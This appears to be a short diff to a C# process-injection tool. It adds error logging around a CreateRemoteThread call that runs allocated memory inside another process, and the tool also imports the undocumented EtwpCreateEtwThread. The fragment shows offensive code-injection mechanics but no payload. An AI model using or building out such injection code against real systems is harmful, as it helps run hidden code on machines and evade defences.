@@ -9,6 +9,8 @@ namespace ProcessInjection
 {
     class exec
     {
+        public static int error = Marshal.GetLastWin32Error();
+
         [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
         static extern IntPtr EtwpCreateEtwThread(IntPtr lpStartAddress, IntPtr lpParameter);
 
@@ -39,6 +41,10 @@ namespace ProcessInjection
             Console.WriteLine("[+] Run with CreateRemoteThread");
             uint Nthreadid = 0;
             IntPtr hthread = CreateRemoteThread(prochandle, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, out Nthreadid);
+            Console.WriteLine("[+] Run with CreateRemoteThread :"+ hthread);
+            error = Marshal.GetLastWin32Error();
+
+            Console.WriteLine("The last Win32 Error was: " + error);
             return hthread;
         }
 
